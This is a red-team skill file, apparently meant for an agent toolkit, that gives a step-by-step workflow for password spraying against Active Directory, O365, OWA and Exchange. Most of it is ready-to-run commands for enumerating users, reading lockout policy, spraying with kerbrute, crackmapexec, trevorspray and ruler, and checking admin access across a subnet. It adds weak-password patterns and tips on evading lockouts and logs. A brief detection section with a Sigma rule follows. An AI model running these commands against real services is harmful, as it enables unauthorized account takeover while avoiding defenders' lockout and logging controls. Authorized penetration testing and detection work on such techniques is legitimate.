---
name: performing-password-spraying
description: <!-- Copyright (c) 2026 defconxt. All rights reserved. -->
---

<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: performing-password-spraying
description: >-
  Execute password spraying attacks against enterprise services. Covers
  credential validation against AD, OWA, O365, VPN, and cloud endpoints
  while evading lockout policies.
domain: cybersecurity
subdomain: red-team
tags:
  - password-spraying
  - credential-attack
  - brute-force
  - active-directory
  - o365
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1110.003", "T1078.002", "T1078.004"]
  tools: ["sprayhound", "kerbrute", "trevorspray", "crackmapexec"]
---

# Performing Password Spraying

## Overview

Password spraying tests one password against many accounts simultaneously,
staying below lockout thresholds. Effective because organizations commonly
have users with weak or default passwords (Season+Year, Company+123).

## Prerequisites

- Username list (harvested via OSINT, LinkedIn, LDAP enum)
- Network access to target authentication service
- Knowledge of lockout policy (threshold, window, reset time)

```bash
pip install sprayhound
go install github.com/ropnop/kerbrute@latest
```

## Key Concepts

### Lockout Policy Awareness

| Parameter | Typical Value |
|-----------|---------------|
| Lockout threshold | 3-5 attempts |
| Observation window | 30 minutes |
| Lockout duration | 30 minutes |
| Safe spray rate | 1 password / window |

### Common Password Patterns

| Pattern | Example |
|---------|---------|
| Season+Year | Winter2026! |
| Company+Number | Acme123! |
| Month+Year | March2026! |
| Welcome+N | Welcome1! |
| Password+N | Password1! |

## Workflow

### Step 1: Enumerate Valid Users

```bash
# Kerbrute — user enumeration via Kerberos (no lockout)
kerbrute userenum --dc 10.10.10.1 -d corp.local users.txt

# LDAP enum
ldapsearch -H ldap://10.10.10.1 -D "user@corp.local" -w 'Pass123' \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName

# O365 enum (no lockout)
python o365enum.py -u users.txt -d target.com
```

### Step 2: Check Lockout Policy

```bash
# CrackMapExec
crackmapexec smb 10.10.10.1 -u user -p 'Pass123' --pass-pol

# rpcclient
rpcclient -U 'user%Pass123' 10.10.10.1 -c 'getdompwinfo'
```

### Step 3: Spray Against AD/SMB

```bash
# CrackMapExec — one password at a time
crackmapexec smb 10.10.10.1 -u users.txt -p 'Winter2026!' --continue-on-success

# Kerbrute — faster, no event logs on failure
kerbrute passwordspray --dc 10.10.10.1 -d corp.local users.txt 'Winter2026!'

# SprayHound — lockout-aware
sprayhound -U users.txt -p 'Winter2026!' -d corp.local -dc 10.10.10.1 --safe
```

### Step 4: Spray Against O365/Azure

```bash
# TREVORspray — Microsoft O365
trevorspray -u users.txt -p 'Winter2026!' --url https://login.microsoftonline.com

# With delay between attempts
trevorspray -u users.txt -p passwords.txt --delay 1800 --jitter 30
```

### Step 5: Spray Against OWA/Exchange

```bash
# Ruler — OWA spray
ruler --domain corp.local --url https://mail.corp.local/owa \
  brute --users users.txt --passwords passwords.txt --delay 1800

# MailSniper
Invoke-PasswordSprayOWA -ExchHostname mail.corp.local \
  -UserList .\users.txt -Password 'Winter2026!'
```

### Step 6: Validate and Expand

```bash
# Verify valid credentials
crackmapexec smb 10.10.10.1 -u validuser -p 'Winter2026!' --shares

# Check for admin access
crackmapexec smb 10.10.10.0/24 -u validuser -p 'Winter2026!' --local-auth
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|-------------|
| Event 4771 | DC Security | Kerberos pre-auth failures across accounts |
| Event 4625 | DC Security | Logon failures — same password different users |
| Sign-in logs | Azure AD | Multiple failed auth from single IP |
| Lockouts | Event 4740 | Account lockouts in bursts |

```yaml
title: Password Spraying — Multiple Failed Logins Same Source
id: c3d4e5f6-7081-9012-cdef-012345678902
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4625
    LogonType: 3
  timeframe: 30m
  condition: selection | count(TargetUserName) by IpAddress > 10
falsepositives:
  - Vulnerability scanners with credential checks
level: high
tags:
  - attack.t1110.003
  - attack.credential_access
```

## Verification

- [ ] Valid usernames enumerated
- [ ] Lockout policy identified
- [ ] Spray executed within safe thresholds
- [ ] Valid credentials discovered
- [ ] Detection artifacts documented

## References

- [Kerbrute](https://github.com/ropnop/kerbrute)
- [TREVORspray](https://github.com/blacklanternsecurity/TREVORspray)
- [MITRE T1110.003](https://attack.mitre.org/techniques/T1110/003/)
